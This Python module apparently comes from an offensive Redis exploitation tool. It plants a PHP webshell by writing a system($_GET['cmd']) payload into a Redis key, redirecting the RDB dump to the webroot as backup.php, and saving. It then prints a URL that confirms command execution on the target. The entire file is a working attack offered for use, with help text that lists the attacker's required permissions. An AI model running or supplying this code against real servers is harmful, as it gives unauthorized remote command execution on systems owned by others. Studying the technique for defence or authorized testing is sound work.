from redis.exceptions import ResponseError
from .common import get_assume_defaults_value
from .utils import do_post_attack_restoration, get_hostname



def webshell_help():
    return "\nUse this technique to gain a shell session by\n" \
    "adding a webshell in the WEBROOT directory using\n" \
    "the RDB file save technique.\n\n" \
    "Some important points to note here would be:\n" \
    "1. The attacker MUST have permissions to issue the following commands:\n" \
    "    i. SET\n" \
    "   ii. CONFIG SET\n" \
    "  iii. SAVE\n" \
    "   iv. FLUSHALL (or FLUSHDB)\n" \
    "2. The user running redis-server must have permissions to add the\n" \
    "webshell to the WEBROOT directory.\n" \
    "3. It must be implied but stating for completeness - a webserver must\n" \
    "be running on the target server.\n"



def webshell(pipeline, dir):

    assume_defaults = get_assume_defaults_value()

    # Add our public key to the set of authorized SSH keys
    pipeline.set("webshell", "<?php echo '\n\n';system($_GET['cmd']);echo '\n\n'; ?>")

    webroot_dir = "/var/www/html"

    if not assume_defaults:
        webroot_dir = input("\nWEBROOT dir (default='/var/www/html'): ") or webroot_dir

    pipeline.config_set("dir", webroot_dir)
    pipeline.config_set("dbfilename", "backup.php")

    pipeline.save()

    try:
        # print(pipeline.execute())
        pipeline.execute()
    except ResponseError as e:
        print ("\nError:", str(e), "\n")
        print ("Most probably the permissions to write to the WEBROOT directory are missing!\n")

        do_post_attack_restoration(pipeline, "webshell", dir)

        return

    # Do some restoration work as well...
    do_post_attack_restoration(pipeline, "webshell", dir)

    print ("\nAnd by now you should have webshell access!\n")

    hostname = get_hostname(pipeline)

    print ("Open this URL to confirm:")
    print (f"http://{hostname}/backup.php?cmd=id\n")